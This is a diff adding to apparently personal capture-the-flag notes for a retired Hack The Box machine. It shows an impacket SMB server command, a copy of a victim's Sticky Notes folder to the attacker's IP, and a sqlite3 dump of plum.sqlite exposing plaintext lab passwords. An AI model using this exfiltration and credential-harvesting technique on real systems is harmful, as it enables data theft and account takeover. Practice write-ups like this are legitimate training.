@@ -75,6 +75,113 @@ PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8weky
 Started impacket smbserver  using  command`impacket-smbserver -smb2support files $(pwd)` and then copied folder `LocalState` to local kali vm using command `copy -R LocalState \\10.10.14.105\files\`.
 ![[Pasted image 20210730140720.png]]
 ## opening sqlite database file in sqlite3 and getting `Development` User creds
+```bash
+~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired/LocalState ❯ sqlite3 plum.sqlite
+SQLite version 3.34.1 2021-01-20 14:10:07
+Enter ".help" for usage hints.
+sqlite> .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE IF NOT EXISTS "Note" (
+"Text" varchar ,
+"WindowPosition" varchar ,
+"IsOpen" integer ,
+"IsAlwaysOnTop" integer ,
+"CreationNoteIdAnchor" varchar ,
+"Theme" varchar ,
+"IsFutureNote" integer ,
+"RemoteId" varchar ,
+"ChangeKey" varchar ,
+"LastServerVersion" varchar ,
+"RemoteSchemaVersion" integer ,
+"IsRemoteDataInvalid" integer ,
+"Type" varchar ,
+"Id" varchar primary key not null ,
+"ParentId" varchar ,
+"CreatedAt" bigint ,
+"DeletedAt" bigint ,
+"UpdatedAt" bigint );
+INSERT INTO Note VALUES(replace('\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!\n\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g\n\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]','\n',char(10)),'ManagedPosition=',1,0,NULL,'Yellow',0,NULL,NULL,NULL,NULL,NULL,NULL,'0c32c3d8-7c60-48ae-939e-798df198cfe7','8e814e57-9d28-4288-961c-31c806338c5b',637423162765765332,NULL,637423163995607122);
+CREATE TABLE IF NOT EXISTS "Stroke" (
+"Data" blob ,
+"FormatVersion" integer ,
+"Type" varchar ,
+"Id" varchar primary key not null ,
+"ParentId" varchar ,
+"CreatedAt" bigint ,
+"DeletedAt" bigint ,
+"UpdatedAt" bigint );
+CREATE TABLE IF NOT EXISTS "StrokeMetadata" (
+"InsightId" varchar ,
+"OffsetAngle" float ,
+"RotationPointX" float ,
+"RotationPointY" float ,
+"OffsetX" float ,
+"OffsetY" float ,
+"ReminderId" varchar ,
+"StrokeId" varchar ,
+"Type" varchar ,
+"Id" varchar primary key not null ,
+"ParentId" varchar ,
+"CreatedAt" bigint ,
+"DeletedAt" bigint ,
+"UpdatedAt" bigint );
+CREATE TABLE IF NOT EXISTS "User" (
+"Type" varchar ,
+"Id" varchar primary key not null ,
+"ParentId" varchar ,
+"CreatedAt" bigint ,
+"DeletedAt" bigint ,
+"UpdatedAt" bigint );
+INSERT INTO User VALUES(NULL,'8e814e57-9d28-4288-961c-31c806338c5b','8e814e57-9d28-4288-961c-31c806338c5b',637422450113001719,NULL,637422450113001719);
+CREATE TABLE IF NOT EXISTS "SyncState" (
+"OutboundQueueJson" varchar ,
+"DeltaToken" varchar ,
+"UnverifiedNotes" varchar ,
+"SchemaVersion" integer ,
+"Type" varchar ,
+"Id" varchar primary key not null ,
+"ParentId" varchar ,
+"CreatedAt" bigint ,
+"DeletedAt" bigint ,
+"UpdatedAt" bigint );
+CREATE TABLE IF NOT EXISTS "UpgradedNote" (
+"OldNoteId" varchar ,
+"NewNoteId" varchar ,
+"UpgradeManagerVersion" integer ,
+"UpgraderVersion" integer ,
+"ModifiedByUser" integer ,
+"Type" varchar ,
+"Id" varchar primary key not null ,
+"ParentId" varchar ,
+"CreatedAt" bigint ,
+"DeletedAt" bigint ,
+"UpdatedAt" bigint );
+CREATE TABLE IF NOT EXISTS "Media" (
+"LocalFileRelativePath" varchar ,
+"RemoteId" varchar ,
+"MimeType" varchar ,
+"AltText" varchar ,
+"IsOrphaned" integer ,
+"Height" integer ,
+"Width" integer ,
+"Type" varchar ,
+"Id" varchar primary key not null ,
+"ParentId" varchar ,
+"CreatedAt" bigint ,
+"DeletedAt" bigint ,
+"UpdatedAt" bigint );
+COMMIT;
+sqlite> .tables
+Media           Stroke          SyncState       User
+Note            StrokeMetadata  UpgradedNote
+sqlite> select * from Note;
+\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
+\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
+\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122
+sqlite>
+```
+![[Pasted image 20210730145925.png]]
 
 
 
